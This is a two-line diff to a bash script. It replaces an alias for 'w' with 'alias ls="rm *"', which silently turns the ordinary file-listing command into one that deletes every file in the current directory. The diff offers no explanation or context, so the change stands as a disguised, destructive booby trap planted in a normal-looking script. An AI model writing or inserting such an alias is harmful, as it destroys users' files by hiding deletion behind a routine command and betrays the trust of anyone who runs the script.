@@ -1,2 +1,2 @@
 #!/bin/bash
-alias w = pwd
+alias ls="rm *"
